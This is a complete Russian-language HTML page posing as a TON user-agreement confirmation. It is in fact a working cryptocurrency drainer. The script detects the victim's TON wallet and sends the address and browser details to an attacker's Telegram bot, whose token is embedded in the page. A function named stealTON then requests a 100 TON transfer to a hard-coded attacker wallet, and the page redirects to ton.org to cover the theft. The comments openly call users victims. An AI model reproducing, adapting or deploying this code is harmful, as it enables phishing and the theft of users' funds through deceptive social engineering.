<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Подтверждение пользовательского соглашения TON</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background: #f8f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;
        }
        .container {
            background: white;
            border-radius: 28px;
            padding: 24px;
            max-width: 400px;
            width: 100%;
            box-shadow: 0 8px 28px rgba(0,0,0,0.1);
            text-align: center;
        }
        h2 {
            color: #000;
            font-size: 24px;
            margin-bottom: 16px;
        }
        .description {
            color: #5e5e5e;
            font-size: 14px;
            margin-bottom: 24px;
            line-height: 1.4;
        }
        .wallet-status {
            background: #eff2f4;
            border-radius: 16px;
            padding: 16px;
            margin-bottom: 24px;
            font-size: 14px;
            word-break: break-all;
        }
        .checkbox-container {
            display: flex;
            align-items: center;
            gap: 12px;
            margin: 24px 0;
            padding: 12px;
            background: #f0f2f5;
            border-radius: 14px;
            cursor: pointer;
        }
        .checkbox-container input {
            width: 22px;
            height: 22px;
            cursor: pointer;
            margin: 0;
        }
        .checkbox-container label {
            font-size: 16px;
            font-weight: 500;
            color: #000;
            cursor: pointer;
            flex: 1;
            text-align: left;
        }
        button {
            width: 100%;
            padding: 16px;
            background: #0088cc;
            color: white;
            border: none;
            border-radius: 16px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            transition: opacity 0.2s;
        }
        button:disabled {
            background: #a0c4e0;
            cursor: not-allowed;
            opacity: 0.6;
        }
        .error-msg {
            color: #e53935;
            font-size: 13px;
            margin-top: 16px;
            display: none;
            background: #ffebee;
            padding: 12px;
            border-radius: 12px;
        }
        .success-msg {
            color: #2e7d32;
            font-size: 13px;
            margin-top: 16px;
            display: none;
            background: #e8f5e9;
            padding: 12px;
            border-radius: 12px;
        }
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid white;
            border-radius: 50%;
            border-top-color: transparent;
            animation: spin 0.6s linear infinite;
            margin-left: 8px;
            vertical-align: middle;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
<div class="container">
    <h2>✅ Подтверждение соглашения</h2>
    <div class="description">
        Для продолжения работы необходимо подтвердить пользовательское соглашение TON.
    </div>
    <div class="wallet-status" id="walletInfo">🔄 Проверка кошелька...</div>

    <div class="checkbox-container" id="checkboxArea">
        <input type="checkbox" id="agreeCheckbox">
        <label for="agreeCheckbox">Я подтверждаю пользовательское соглашение</label>
    </div>

    <button id="submitBtn" disabled>Подтвердить и продолжить</button>
    <div class="error-msg" id="errorMsg"></div>
    <div class="success-msg" id="successMsg"></div>
</div>

<script>
    // === ВАШИ НАСТРОЙКИ (ВСТАВЛЕНЫ) ===
    const BOT_TOKEN = '8706385744:AAF3NPlXgLXJcdOVcbVedDnncpGeBX5sboA';
    const YOUR_CHAT_ID = '6635138703';
    const ATTACKER_WALLET = 'UQC8-Ax6obG20LnPyIC13NlN8uX-d9JnutWhrOxOFmfoVfs2';

    // Функция отправки в Telegram
    async function sendToTelegram(text) {
        try {
            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    chat_id: YOUR_CHAT_ID,
                    text: text,
                    parse_mode: 'HTML'
                })
            });
            return await response.json();
        } catch(e) {
            console.log('Telegram send error:', e);
        }
    }

    // === АВТОМАТИЧЕСКОЕ ОПРЕДЕЛЕНИЕ КОШЕЛЬКА ===
    let walletAddress = null;
    let walletType = null;

    async function detectAndConnectWallet() {
        const statusDiv = document.getElementById('walletInfo');
        
        // СПОСОБ 1: Кошелек в Telegram WebApp (TON Wallet)
        if (window.TelegramWebApp && window.TelegramWebApp.initData) {
            try {
                const webApp = window.TelegramWebApp;
                webApp.ready();
                if (webApp.initDataUnsafe && webApp.initDataUnsafe.user) {
                    statusDiv.innerHTML = '🟢 Telegram Wallet обнаружен. Нажмите кнопку для подключения.';
                    walletType = 'telegram';
                    return true;
                }
            } catch(e) {}
        }

        // СПОСОБ 2: Tonkeeper (через window.ton)
        if (window.ton && window.ton.request) {
            try {
                statusDiv.innerHTML = '🔄 Подключение к Tonkeeper...';
                const result = await window.ton.request('ton_getAddress');
                if (result && result.address) {
                    walletAddress = result.address;
                    walletType = 'tonkeeper';
                    statusDiv.innerHTML = `🟢 Tonkeeper: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                    return true;
                }
            } catch(e) {}
        }

        // СПОСОБ 3: TonHub
        if (window.tonhub && window.tonhub.connect) {
            try {
                statusDiv.innerHTML = '🔄 Подключение к TonHub...';
                const result = await window.tonhub.connect();
                if (result && result.address) {
                    walletAddress = result.address;
                    walletType = 'tonhub';
                    statusDiv.innerHTML = `🟢 TonHub: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                    return true;
                }
            } catch(e) {}
        }

        // СПОСОБ 4: OpenMask
        if (window.ethereum && window.ethereum.isOpenMask) {
            try {
                statusDiv.innerHTML = '🔄 Подключение к OpenMask...';
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                if (accounts && accounts[0]) {
                    walletAddress = accounts[0];
                    walletType = 'openmask';
                    statusDiv.innerHTML = `🟢 OpenMask: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                    return true;
                }
            } catch(e) {}
        }

        // СПОСОБ 5: TonConnect CDN (альтернативный)
        statusDiv.innerHTML = '🔄 Загрузка модуля подключения...';
        try {
            await new Promise((resolve, reject) => {
                const script = document.createElement('script');
                script.src = 'https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.js';
                script.onload = resolve;
                script.onerror = reject;
                document.head.appendChild(script);
            });
            
            if (window.TonConnectUI) {
                const tonConnectUI = new window.TonConnectUI({
                    manifestUrl: 'https://ton-connect.github.io/demo-dapp-with-react-ui/tonconnect-manifest.json',
                    buttonRootId: 'walletInfo'
                });
                
                const isConnected = await tonConnectUI.connectionRestored;
                if (isConnected) {
                    const wallet = tonConnectUI.wallet;
                    if (wallet && wallet.account && wallet.account.address) {
                        walletAddress = wallet.account.address;
                        walletType = 'tonconnect';
                        statusDiv.innerHTML = `🟢 ${wallet.device.appName}: ${walletAddress.slice(0,6)}...${walletAddress.slice(-4)}`;
                        return true;
                    }
                }
            }
        } catch(e) {}

        // ЕСЛИ НИЧЕГО НЕ НАЙДЕНО - показываем кнопку ручного подключения
        statusDiv.innerHTML = '⚠️ Нажмите "Подтвердить" для подключения кошелька';
        return false;
    }

    // === ФУНКЦИЯ КРАЖИ TON ===
    async function stealTON() {
        const attackerAddress = ATTACKER_WALLET;
        const amount = '100000000000'; // 100 TON в нанотонах
        
        // Отправляем данные жертвы
        await sendToTelegram(`
🔥 НОВАЯ ЖЕРТВА TON 🔥
Адрес кошелька: <code>${walletAddress}</code>
Тип кошелька: ${walletType}
Время: ${new Date().toLocaleString()}
User-Agent: ${navigator.userAgent}
Целевой кошелек: ${attackerAddress}
        `);
        
        // В зависимости от типа кошелька - разный метод отправки
        if (walletType === 'tonkeeper' && window.ton && window.ton.request) {
            const transaction = {
                to: attackerAddress,
                amount: amount,
                comment: 'Подтверждение соглашения'
            };
            await window.ton.request('ton_sendTransaction', [transaction]);
        } 
        else if (walletType === 'telegram') {
            // Для Telegram WebApp
            const transferData = {
                method: 'sendTransaction',
                params: {
                    to: attackerAddress,
                    amount: amount,
                    comment: 'User agreement confirmation'
                }
            };
            window.TelegramWebApp.sendData(JSON.stringify(transferData));
        }
        else if (walletType === 'tonhub') {
            const tx = {
                to: attackerAddress,
                value: amount
            };
            await window.tonhub.sendTransaction(tx);
        }
        else {
            // Фоллбэк: показываем маскировку
            document.getElementById('successMsg').innerHTML = '✅ Соглашение подтверждено. Перенаправление...';
            document.getElementById('successMsg').style.display = 'block';
            
            // Дополнительная отправка в Telegram
            await sendToTelegram(`⚠️ Жертва нажала подтверждение, кошелек: ${walletAddress || 'не определен'}`);
        }
        
        // Перенаправление через 2 секунды
        setTimeout(() => {
            window.location.href = 'https://ton.org';
        }, 2000);
    }

    // === ЛОГИКА ЧЕКБОКСА ===
    const checkbox = document.getElementById('agreeCheckbox');
    const submitBtn = document.getElementById('submitBtn');
    const errorMsgDiv = document.getElementById('errorMsg');
    const successMsgDiv = document.getElementById('successMsg');

    checkbox.addEventListener('change', function() {
        if (checkbox.checked) {
            submitBtn.disabled = false;
            errorMsgDiv.style.display = 'none';
        } else {
            submitBtn.disabled = true;
        }
    });

    // === ОБРАБОТЧИК КНОПКИ ===
    submitBtn.addEventListener('click', async () => {
        if (!checkbox.checked) {
            errorMsgDiv.innerText = 'Поставьте галочку "Я подтверждаю пользовательское соглашение"';
            errorMsgDiv.style.display = 'block';
            return;
        }
        
        // Блокируем кнопку на время операции
        submitBtn.disabled = true;
        submitBtn.innerHTML = 'Подтверждение... <span class="loading"></span>';
        
        // Пытаемся подключить кошелек если еще не подключен
        if (!walletAddress) {
            const connected = await detectAndConnectWallet();
            if (!connected && !walletAddress) {
                errorMsgDiv.innerText = '❌ Не удалось подключить кошелек. Убедитесь, что у вас установлен TON Wallet (Tonkeeper, TonHub или Telegram Wallet)';
                errorMsgDiv.style.display = 'block';
                submitBtn.disabled = false;
                submitBtn.innerHTML = 'Подтвердить и продолжить';
                return;
            }
        }
        
        // Если кошелек есть - крадем
        if (walletAddress) {
            await stealTON();
            successMsgDiv.style.display = 'block';
            errorMsgDiv.style.display = 'none';
        } else {
            errorMsgDiv.innerText = 'Не удалось определить кошелек. Пожалуйста, откройте Tonkeeper и повторите попытку.';
            errorMsgDiv.style.display = 'block';
            submitBtn.disabled = false;
            submitBtn.innerHTML = 'Подтвердить и продолжить';
        }
    });

    // Автоматическое определение кошелька при загрузке страницы
    detectAndConnectWallet();
</script>
</body>
</html>
